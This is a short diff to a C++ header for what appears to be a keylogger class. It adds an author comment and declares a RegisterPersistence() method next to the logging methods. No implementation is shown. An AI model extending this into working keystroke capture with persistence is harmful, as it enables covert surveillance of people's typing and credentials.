@@ -1,3 +1,5 @@
+//   Author(s) : Narcis GRECU(narcisgrecu07@gmail.com
+
 #ifndef __KEY_LOGGER_H__
 #define __KEY_LOGGER_H__
 
@@ -22,6 +24,7 @@ public:
 	void StartLogging();
 	std::string GetChar(char Key, bool CapsIsPressed);
 	void WriteMessage(std::string Message);
+	bool RegisterPersistence();
 };
 
 #endif
